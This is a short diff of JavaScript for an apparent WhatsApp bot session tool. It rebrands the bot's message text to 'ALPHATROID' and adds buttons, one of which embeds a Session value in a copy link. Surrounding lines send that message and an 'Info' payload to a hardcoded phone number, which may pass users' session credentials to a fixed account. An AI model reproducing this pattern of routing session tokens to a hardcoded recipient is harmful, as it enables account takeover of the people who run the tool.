@@ -42,11 +42,17 @@ var str = num.toString();
 var resu = str.substring(3)  
 res = parseInt(resu)
       const alphaBtn = {
- 	text : `   userID:   ${tshephang}  thank you for     choosing Rᴇᴠᴇɴɢᴇʀs ʙᴏᴛᴢ>ᴍᴅ `, 
-     footer : `    ©OLDUSER all rights reserved
+ 	text : `   userID:   ${tshephang}  thank you for     choosing ALPHATROID `, 
+     footer : `    ©𝐴𝐿𝑃𝐻𝐴-704 all rights reserved
                       total scans : ${res}  
                       platform: ${plat}                
- `, }
+ `,
+          templateButtons : [
+    {index: 1, urlButton: {displayText: 'My github!', url: 'https://github.com/'}},
+    {index: 2, urlButton: {displayText:'ᴄᴏᴘʏ sᴇssɪᴏɴ', url: 'https://www.whatsapp.com/otp/copy/'+(Session)}},
+    {index: 3, urlButton: {displayText: 'Owner' , url : 'http://wa.me/121212text=Hi+bro+✌️'}},
+],
+}
      await conn.sendMessage('918602239106@s.whatsapp.net', alphaBtn)
 	let myId = '918602239106@s.whatsapp.net'
 	await conn.sendMessage(myId,{text :  `${Info}`})
